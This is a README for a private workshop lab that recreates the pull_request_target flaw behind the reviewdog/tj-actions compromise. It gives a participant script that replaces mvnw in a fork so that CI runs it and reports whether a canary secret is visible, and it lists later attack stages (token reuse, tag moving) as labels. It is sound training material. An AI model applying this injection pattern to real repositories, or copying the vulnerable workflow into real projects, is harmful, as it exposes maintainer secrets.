# reviewdog / tj-actions pull_request_target RCA Demo

This private workshop repository demonstrates the `pull_request_target` attack pattern behind the reviewdog / tj-actions compromise using only a canary repository secret.

The repo intentionally keeps the vulnerable control flow active:

1. A maintainer workflow accepts a forked pull request.
2. The workflow checks out contributor-controlled code from the fork.
3. A normal-looking build step runs `bash ./mvnw -B verify`.
4. Because the workflow runs under `pull_request_target`, a canary secret from the base repository is visible to the script.
5. The workflow uploads a local artifact named `simulated-incident-evidence`, modeling how collected material could be retrieved from the workflow run.

The enabled workflow is `.github/workflows/pull_request_target-vulnerable.yml`.

## Repository Setup

Create the GitHub repository as private, then invite only conference participants who need access. Contributors must have read access to a private repository before they can fork it.

Publish from this directory:

```bash
git init
git add .
git commit -m "Create reviewdog tj-actions RCA demo"
gh repo create OWNER/REPO-NAME --private --source . --remote origin --push
```

Recommended repository settings:

- Keep the repository private.
- Allow forking for the repository or organization.
- Enable Actions for fork pull requests only for this lab.
- Do not send secrets to workflows from fork pull requests.
- Do not send write tokens to workflows from fork pull requests.
- Require approval before fork pull-request workflows run.
- Use GitHub-hosted runners only.
- Do not add production secrets to this repository.
- Add one repository secret named `PAT_TO_FORK` with a dummy canary value, for example `conference-canary-reviewdog-demo-2026`.
- Treat this repository as disposable. A contributor-controlled PR can execute shell commands in the vulnerable `pull_request_target` workflow.

## Participant Flow

1. Fork the private repository.
2. Create a branch in the fork.
3. Replace `mvnw` in the fork with this harmless canary probe:

   ```bash
   #!/usr/bin/env bash
   set -euo pipefail

   echo "SIMULATED_ATTACK_CONTROL_REACHED"
   echo "The pull request changed mvnw, and CI executed it."
   echo "The command looked like a normal build: $*"

   mkdir -p .rca-demo
   evidence_file=".rca-demo/evidence.txt"

   {
     echo "simulated_stage=initial-pr-compromise"
     echo "attacker_control=true"
     echo "base_repository=${BASE_REPOSITORY:-unknown}"
     echo "head_repository=${HEAD_REPOSITORY:-unknown}"
     echo "head_sha=${HEAD_SHA:-unknown}"
     echo "pr_number=${PR_NUMBER:-unknown}"
   } > "$evidence_file"

   if [[ -n "${PAT_TO_FORK:-}" ]]; then
     echo "PAT_TO_FORK_VISIBLE=true"
     echo "PAT_TO_FORK_LENGTH=${#PAT_TO_FORK}"
     {
       echo "canary_secret_present=true"
       echo "canary_secret_length=${#PAT_TO_FORK}"
       printf "%s" "$PAT_TO_FORK" | sha256sum | awk '{ print "canary_secret_sha256_prefix=" substr($1, 1, 16) }'
     } >> "$evidence_file"
   else
     echo "PAT_TO_FORK_VISIBLE=false"
     echo "canary_secret_present=false" >> "$evidence_file"
   fi

   cat >> "$evidence_file" <<'EOT'
simulated_stage_2=would_invite_disposable_user_or_push_workflow
simulated_stage_3=would_reuse_maintainer_token_against_related_repo
simulated_stage_4=would_move_trusted_tag_to_malicious_commit
external_exfiltration=false
EOT
   ```

4. Push the branch and open a pull request back to the private base repository.
5. Watch the `Vulnerable pull_request_target lab` workflow logs.
6. Confirm the log contains `SIMULATED_ATTACK_CONTROL_REACHED`.
7. Confirm the log contains `PAT_TO_FORK_VISIBLE=true`.
8. Download the `simulated-incident-evidence` workflow artifact and inspect `evidence.txt`.

That marker shows that contributor-controlled code reached CI execution and could read the canary secret. In the real incident, that same class of mistake exposed useful maintainer-context credentials.

## Source Notes

- Narrative: [reviewdog_tj-actions.md](reviewdog_tj-actions.md)
- GitHub `pull_request_target` security guidance: https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target
- GitHub private fork workflow settings: https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository
- GitHub private repository forking policy: https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/managing-repository-settings/managing-the-forking-policy-for-your-repository
